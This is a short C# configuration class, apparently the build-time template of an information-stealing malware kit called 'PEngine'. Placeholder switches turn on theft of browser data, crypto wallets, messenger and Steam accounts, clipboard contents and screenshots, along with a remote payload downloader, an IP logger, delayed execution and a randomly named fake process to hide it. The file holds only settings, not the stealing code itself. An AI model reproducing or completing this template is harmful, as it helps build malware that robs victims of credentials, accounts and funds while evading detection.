using System;

namespace PEngine.Main
{
    public class Date
    {
        public static bool AdminRight = [AdminRight];
        public static bool Buffer = [Buffer];
        public static bool Browsers = [Browsers];
        public static bool Programs = [Programs];
        public static bool CryptoWall = [CryptoWall];
        public static bool Clients = [Messengers];
        public static bool InfoGrabber = true; 
        public static bool ScreenShot = [ScreenShot];
        public static bool Steam = [Steam];
        public static bool Downloader = [Downloader];
        public static string DownloaderLink = "[DownloaderLink]";
        public static string DownloaderPath = "[DownloaderPath]";
        public static bool Delay = [DataBuild.Delay];
        public static string IpLoggerLink = "IpLoggerLink";
        public static bool IpLogger = true;
        public static int DelaySec = 10;

        public static string FakeNameProcess = Guid.NewGuid().ToString().Substring(5, 8) + ".exe";
        public static int DelayTime = 100 * 1000;
    }
}